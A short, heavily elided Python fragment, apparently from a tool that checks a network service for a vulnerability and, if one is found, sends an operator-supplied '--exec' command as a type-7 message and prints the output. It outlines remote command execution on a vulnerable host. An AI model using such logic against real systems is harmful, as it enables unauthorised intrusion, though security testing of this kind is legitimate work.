...
command_group.add_argument('--exec', type=str, nargs='?', help='run a command and dump straight to stdout', default='')
...
if args.is_vuln :
	...
	sys.stdout.write(send_message(s, endianness, 7, args.exec)[1])
